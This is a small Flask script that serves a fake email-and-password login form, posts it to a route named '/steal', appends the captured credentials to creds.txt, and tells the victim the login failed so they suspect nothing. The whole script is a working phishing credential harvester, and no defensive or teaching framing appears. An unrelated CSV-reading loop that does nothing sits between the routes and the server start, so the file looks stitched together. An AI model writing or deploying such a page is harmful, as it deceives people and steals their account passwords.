from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def login():
    return '''
    <form method="POST" action="/steal">
      Email: <input name="email"><br>
      Password: <input name="password"><br>
      <input type="submit">
    </form>
    '''

@app.route('/steal', methods=['POST'])
def steal():
    email = request.form['email']
    password = request.form['password']
    with open('creds.txt', 'a') as f:
        f.write(f'{email}:{password}\n')

    return 'Login failed. Please try again.'

import csv

# CSV reading section
with open('data.csv', 'r') as file:
    reader = csv.reader(file)
    for row in reader:
        pass

        

app.run(port=5000, debug='true')
